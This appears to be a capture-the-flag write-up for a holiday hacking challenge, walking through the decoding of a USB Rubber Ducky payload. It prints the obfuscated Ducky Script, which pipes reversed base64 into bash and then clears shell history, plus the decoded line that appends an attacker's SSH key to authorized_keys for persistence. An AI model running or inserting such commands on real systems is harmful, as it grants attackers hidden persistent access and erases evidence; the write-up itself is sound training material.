# OBJECTIVE 5 - Strange USB Device #

## OBJECTIVE : ##
>Assist the elves in reverse engineering the strange USB device.  Visit Santa’s Talks Floor and hit up Jewel Loggins for advice.
#  

## HINTS: ##
<details>
  <summary>Hints provided for Objective 5</summary>
  
>-	[Ducky Script](https://docs.hak5.org/hc/en-us/articles/360010555153-Ducky-Script-the-USB-Rubber-Ducky-language) is the language for the USB Rubber Ducky
>-	Attackers can encode Ducky Script using a [duck encoder](https://docs.hak5.org/hc/en-us/articles/360010471234-Writing-your-first-USB-Rubber-Ducky-Payload) for delivery as `inject.bin`.
>-	It's also possible the reverse engineer encoded Ducky Script using [Mallard](https://github.com/dagonis/Mallard).
>-	The [MITRE ATT&CK™ tactic T1098.004](https://attack.mitre.org/techniques/T1098/004/) describes SSH persistence techniques through authorized keys files.

</details>

#  

## PROCEDURE : ##

The **Strange USB Device** is located on the 2nd floor in the **Speaker Un-Preparedness Room** (by the vending machine).  

At first glance there is a file `inject.bin` in the `/mnt/USBDEVICE/` directory, the contents of which appear to be unreadable.  From the hints and narrative, I know that this is some kind of Rubber Ducky USB device mounted to the terminal.  Conveniently we also find `mallard.py` 

```python
DELAY 200
STRING echo ==gCzlXZr9FZlpXay9Ga0VXYvg2cz5yL+BiP+AyJt92YuIXZ39Gd0N3byZ2ajFmau4WdmxGbvJHdAB3bvd2Ytl3ajlGILFESV1mWVN2SChVYTp1VhNlRyQ1UkdFZopkbS1EbHpFSwdlVRJlRVNFdwM2SGVEZnRTaihmVXJ2ZRhVWvJFSJBTOtJ2ZV12YuVlMkd2dTVGb0dUSJ5UMVdGNXl1ZrhkYzZ0ValnQDRmd1cUS6x2RJpHbHFWVClHZOpVVTpnWwQFdSdEVIJlRS9GZyoVcKJTVzwWMkBDcWFGdW1GZvJFSTJHZIdlWKhkU14UbVBSYzJXLoN3cnAyboNWZ | rev | base64 -d | bash
ENTER
DELAY 600
STRING history -c && rm .bash_history && exit
ENTER
DELAY 600
GUI q
```

That hash at the start of the file is particularly interesting – it also seems to be followed by some handy instructions for us!  So, by first running `rev` to reverse the hash and then `base64 -d` to decode it, we get the following:

```console
echo 'ssh-rsa UmN5RHJZWHdrSHRodmVtaVp0d1l3U2JqZ2doRFRHTGRtT0ZzSUZNdyBUaGlzIGlzIG5vdCByZWFsbHkgYW4gU1NIIGtleSwgd2UncmUgbm90IHRoYXQgbWVhbi4gdEFKc0tSUFRQVWpHZGlMRnJhdWdST2FSaWZSaXBKcUZmUHAK ickymcgoop@trollfun.jackfrosttower.com' >> ~/.ssh/authorized_keys
```

And there it is – we have a username!  **`ickymcgoop`**`@trollfun.jackfrosttower.com`

 
